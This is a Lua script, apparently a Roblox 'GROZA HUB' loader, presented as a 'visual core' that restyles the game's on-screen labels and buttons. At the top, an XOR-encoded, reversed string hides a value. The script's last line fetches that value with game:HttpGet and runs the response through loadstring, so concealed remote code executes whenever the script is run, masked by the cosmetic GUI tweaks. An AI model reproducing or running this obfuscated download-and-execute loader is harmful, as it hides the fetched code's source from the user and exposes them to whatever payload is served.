
--[[ STAGE 2: VISUAL CORE ]]
local qC7fyAGR7RFNIhVK="\035\200\210\009\007\007\200\202\049\192\194\194\197\252\255\225\231\226\251\232\238\148\250\136\154\156\234\142\133\128\178\238\129\169\183\189\171\168\149\180\171\095\085\162\080\085\085\168\081\090\173\089\189\127\125\070\119\170\106\111\119\030\103\096\027\023\024\072\016\002\000\022\007\000\061\002\050\054\040\108\047\034\043\025\208\223\217\203\214\202\211\197\203\250\241\193\247\253\234\242\245\047\155\246\154\218\223\205\137\137\142\131\136"local SwMgRJiOUUV0t1CE4Z=217 local aC6HEbpaNwJywtbWrS=145 local w0G0m6ldpDz5=1 local X8xQnYwXFAmI6pR=3 local f2k533Mv99J2XKaiHT=5 local MjJVdRUvvCJ7Esvn_=true local HJbJDCZHZRWxUflk4yi_D=bit32 and bit32.bxor if not HJbJDCZHZRWxUflk4yi_D then HJbJDCZHZRWxUflk4yi_D=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local xpozUCixQl3Gncd7iXr={}for OgO2Suh7OKq6xFv=1,#qC7fyAGR7RFNIhVK do local lBu737DPbPWhH=string.byte(qC7fyAGR7RFNIhVK,OgO2Suh7OKq6xFv)local cuJsgG7SsE8U4U_Z=(aC6HEbpaNwJywtbWrS+(OgO2Suh7OKq6xFv*X8xQnYwXFAmI6pR)+f2k533Mv99J2XKaiHT)%256 if w0G0m6ldpDz5==0 then lBu737DPbPWhH=(lBu737DPbPWhH-cuJsgG7SsE8U4U_Z)%256 xpozUCixQl3Gncd7iXr[OgO2Suh7OKq6xFv]=string.char(HJbJDCZHZRWxUflk4yi_D(lBu737DPbPWhH,SwMgRJiOUUV0t1CE4Z))else lBu737DPbPWhH=HJbJDCZHZRWxUflk4yi_D(lBu737DPbPWhH,SwMgRJiOUUV0t1CE4Z)xpozUCixQl3Gncd7iXr[OgO2Suh7OKq6xFv]=string.char((lBu737DPbPWhH-cuJsgG7SsE8U4U_Z)%256)end end local wEPV7tU3NEAbw4D5oVLjO=table.concat(xpozUCixQl3Gncd7iXr)if MjJVdRUvvCJ7Esvn_ then wEPV7tU3NEAbw4D5oVLjO=string.reverse(wEPV7tU3NEAbw4D5oVLjO)end local hGjMNoSPP5qKSyddsO5zJ=wEPV7tU3NEAbw4D5oVLjO
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(hGjMNoSPP5qKSyddsO5zJ))()
